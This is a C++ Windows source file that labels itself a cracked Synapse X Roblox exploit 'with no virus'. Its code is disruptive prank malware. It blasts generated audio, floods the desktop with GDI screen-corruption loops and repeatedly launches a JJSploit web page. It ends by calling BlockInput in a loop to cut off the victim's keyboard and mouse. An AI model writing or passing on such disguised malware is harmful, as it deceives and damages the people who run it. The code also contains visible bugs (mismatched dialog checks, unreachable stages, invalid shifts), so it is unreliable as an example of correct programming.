// SYNAPSE X CRACKED REAL 100% NO VIRUS
#include <Windows.h>
#pragma comment(lib, "winmm.lib")
// REAL SYNAPSE X ReAl
VOID WINAPI Byte() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 20];

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>((t * (t >> 2675) | (t >> 10 & t >> 7) | (t >> 100)));

	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
}

VOID WINAPI Byte2() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 20];

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>((t * (t) << 2 & 2) | (t << 5) | (t << 7));

	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
}

VOID WINAPI Byte3() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 20];

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>((t * (t >> 10 - 5 | t >> 10) | (t >> 5 + 2)));

	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
}

VOID WINAPI Byte4() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 20];

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>((t * (t >> 2675) | (t >> 10 & t >> 7) | (t >> 100)));

	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
}

VOID WINAPI Byte5() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 20];

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>((t * (t >> 17) >> (t >> 1)));

	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR gun, int pew)
{
	MessageBox(NULL, L"epic ROBLOX hacker program thing", L"PRESS OK TO HACK ROBLOX", MB_OKCANCEL);
	if(MessageBox(NULL, L"ARE YOU SURE YOU WILL HACK ROBLOX REAL!!", L"PRESS OK TO HACK ROBLOX", MB_OKCANCEL) == IDYES)
	{
		HDC desk = GetDC(NULL);
		Byte();
		int pairing = GetSystemMetrics(NULL), paired = GetSystemMetrics(1);
		while (1) {
			desk = GetDC(NULL);
			SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 355, rand() % 455)));
			PatBlt(desk, rand() % 555, rand() % 655, pairing, paired, PATINVERT);
			PatBlt(desk, rand() % 755, rand() % 855, pairing, paired, PATPAINT);
			Sleep(10000);
		}
		Sleep(20000);
		HDC des = GetDC(NULL);
		Byte2();
		int client = GetSystemMetrics(NULL), server = GetSystemMetrics(1);
		int x = SM_CXSCREEN, y = SM_CYSCREEN;
		BitBlt(des, client, server, x, y, des, rand() % 155, rand() % 255, SRCINVERT);
		BitBlt(des, client, server, x, y, des, rand() % 355, rand() % 455, SRCPAINT);
		BitBlt(des, client, server, x, y, des, rand() % 555, rand() % 655, SRCCOPY);
		Sleep(20000);
		HDC desker = GetDC(NULL);
		Byte3();
		int motor = GetSystemMetrics(NULL), gpu = GetSystemMetrics(1);
		int map = SM_CXSCREEN, sky = SM_CYSCREEN;
		while (1) {
			desker = GetDC(NULL);
			system("start https://wearedevs.next/d/JJSploit");
			SelectObject(desker, CreateSolidBrush(RGB(rand() % 755, rand() % 855, rand() % 955)));
			BitBlt(desker, motor, gpu, map, sky, desker, rand() % 1555, rand() % 2555, SRCCOPY);
			BitBlt(desker, motor, gpu, map, sky, desker, rand() % 3555, rand() % 4555, SRCINVERT);
			BitBlt(desker, motor, gpu, map, sky, desker, rand() % 5555, rand() % 6555, SRCPAINT);
			PatBlt(desker, motor, gpu, rand() % 7555, rand() % 8555, PATINVERT);
			PatBlt(desker, motor, gpu, rand() % 9555, rand() % 15555, PATPAINT);
		}
		Sleep(20000);
		HDC desm = GetDC(NULL);
		Byte4();
		int imperial = GetSystemMetrics(NULL), emperial = GetSystemMetrics(1);
		int merial = SM_CXSCREEN, serial = SM_CYSCREEN;
		while (true) {
			desm = GetDC(NULL);
			char thing[7000 * 20];
			for (int t = 0; t < sizeof(thing); t++) {
				PatBlt(desm, imperial, emperial, rand() % 129535 + t, rand() % 2594543 * t, PATINVERT);
				PatBlt(desm, imperial, emperial, rand() % 1234 * t, rand() % 155465 + t, PATPAINT);
				BitBlt(desm, imperial, emperial, merial, serial, desm, rand() % 1544 + t * 20, rand() % 254435 + t * 290, SRCCOPY);
				BitBlt(desm, imperial, emperial, merial, serial, desm, rand() % 1544 + t * 14, rand() % 254435 + t * 5767, SRCINVERT);
			}
		}
		Sleep(20000);
		HDC dess = GetDC(NULL);
		Byte5();
		int thinamajig = GetSystemMetrics(NULL), serverscript = GetSystemMetrics(1);
		while (1) {
			dess = GetDC(NULL);
			SelectObject(dess, CreateSolidBrush(RGB(rand() % 2535, rand() % 3545, rand() % 2555)));
			char thv[7000 * 20];
			for (int tm = 0; tm < sizeof(thv); tm++) {
				PatBlt(dess, thinamajig, serverscript, rand() % 153 + tm, rand() % 1522 * tm * 20, PATINVERT);
			}
		}
		MessageBox(NULL, L"WEWZ WEWZ WEWZ", L"NO MORE MOUSE OR KEYBOAD FOR YOU WEWZ", MB_OKCANCEL);
		FreeConsole();
		while (1) {
			BlockInput(true);
		}
	}
	else if (MessageBox(NULL, L"ARE YOU SURE YOU WILL HACK ROBLOX REAL!!", L"PRESS OK TO HACK ROBLOX", MB_OKCANCEL) == IDNO) {
		exit(0);
	}
}
/* WEWZ
   WEWZ
   WEWZ
   WEWZ
   WEWZ
   WEWZ
   WEWZ
*/
// Script made by koda and kerreem wewz!
